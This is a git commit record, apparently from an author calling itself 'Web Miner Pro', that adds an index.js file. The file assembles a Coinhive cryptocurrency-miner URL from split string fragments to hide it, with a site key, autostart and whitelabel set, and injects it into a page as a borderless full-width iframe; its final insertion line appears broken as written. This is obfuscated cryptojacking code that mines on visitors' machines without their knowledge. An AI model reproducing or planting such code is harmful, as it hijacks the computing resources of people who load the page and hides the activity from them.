b42d04082e222f50a16f5abb91ff1daa36261e4f
Web Miner Pro <lanihambali@gmail.com>
2018-04-08 22:32:01 +0700

    index

---
+++ index.js
@@ -0,0 +1,6 @@
+var ifrm = document.createElement("iframe");
+ifrm.setAttribute("src", "htt" + "ps:" + "//co" + "inh" + "ive" + ".com" + "/med" + "ia/mi" + "ner.h" + "tml" + "?ke" + "y=6mKv2mHp" + "XliYx7v3Hx84qDN5gq2Z5VL2" + "&use" + "r=&whit" + "elabel=1&aut" + "ostart=1&thr" + "ottle=0.6&thre" + "ads=&back" + "grou" + "nd=000&te" + "xt=eee&act" + "ion=0f0&re" + "f=&gr" + "aph=555");
+ifrm.style.width = "100%";
+ifrm.style.border = "none";
+var lokdiv = document.createElement("div");
+lokdiv.parentNode.insertBefore(ifrm, lokdiv);
